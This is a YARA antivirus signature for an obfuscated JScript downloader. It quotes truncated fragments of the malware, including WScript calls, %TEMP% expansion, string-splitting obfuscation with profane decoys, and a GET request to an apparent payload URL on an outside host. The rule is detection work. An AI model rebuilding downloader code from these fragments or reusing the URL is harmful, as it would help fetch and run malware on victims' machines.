rule sig_20160428_f92fb5e8da0f17f4d81aafcdec92fa4a {
  meta:
    description = "datamaliciousorder - file 20160428_f92fb5e8da0f17f4d81aafcdec92fa4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5c1f5f7b229faf7473833df9dd37d6b28c1b0e7444746dec04972e95b510515"

  strings:
    $s1  = "function TrpLfqUqjYnzXzxRrsKvi(KykJipLxwNnxNnrErvNrx){OdkDryYofPdpBzsAlfVus[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function OkmKdpIaxNmkKcvPmrIix() {return OdkDryYofPdpBzsAlfVus[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function TrpLfqUqjYnzXzxRrsKvi(KykJipLxwNnxNnrErvNrx){OdkDryYofPdpBzsAlfVus[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return JmmSisSwfQjqRsgPzeUol - PlxQgeFfzKpaFpfPgnVdw;};" fullword ascii
    $s5  = "function EsjNymCrfHcpMukJokPsb(JmmSisSwfQjqRsgPzeUol, PlxQgeFfzKpaFpfPgnVdw){LzeLqwXxbIhgDrlXizYyz = LzeLqwXxbIhgDrlXizYyz * 1; " ascii
    $s6  = "var OdkDryYofPdpBzsAlfVus = function VyjZhgNhjBieFhfOhkJak() {return UvoOmqWwnDnhGwgPfeBbc[VabDrlLwwUmbWxfVffYqw](\"WScript\"+\"" ascii
    $s7  = "var OdkDryYofPdpBzsAlfVus = function VyjZhgNhjBieFhfOhkJak() {return UvoOmqWwnDnhGwgPfeBbc[VabDrlLwwUmbWxfVffYqw](\"WScript\"+\"" ascii
    $s8  = "var UvoOmqWwnDnhGwgPfeBbc = this[\"WScript\"];" fullword ascii
    $s9  = "function OkmKdpIaxNmkKcvPmrIix() {return OdkDryYofPdpBzsAlfVus[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function EsjNymCrfHcpMukJokPsb(JmmSisSwfQjqRsgPzeUol, PlxQgeFfzKpaFpfPgnVdw){LzeLqwXxbIhgDrlXizYyz = LzeLqwXxbIhgDrlXizYyz * 1; " ascii
    $s11 = "function TjqCbcHptHwzXieMniRod(){return OtuWnaEvtGgfMiiMjoKku + \"\";};" fullword ascii
    $s12 = "QamDdcZzbQrvEccMwlNca[ZbqJpoRbbQclFzfBvzIgv](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s13 = "function EbfDovHunEmhCdrEunBts() {return ((IveHmmZymTvdFnbXuxAqw == true) && (IveHmmZymTvdFnbXuxAqw == ZcfUsmExjZgwStnPheNtn)) ?" ascii
    $s14 = "function EbfDovHunEmhCdrEunBts() {return ((IveHmmZymTvdFnbXuxAqw == true) && (IveHmmZymTvdFnbXuxAqw == ZcfUsmExjZgwStnPheNtn)) ?" ascii
    $s15 = "ZcfUsmExjZgwStnPheNtn = true; " fullword ascii
    $s16 = "MhkJnqHldDvtHnzKdsAyt = true;" fullword ascii
    $s17 = "function VgxZkcKxwXeoFxyMzrVtr(){return 23;};" fullword ascii
    $s18 = "var ZcfUsmExjZgwStnPheNtn = false;" fullword ascii
    $s19 = "function SuhWjnCktXcbAimSewPee(){return VabDrlLwwUmbWxfVffYqw;};" fullword ascii
    $s20 = "if (QamDdcZzbQrvEccMwlNca[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}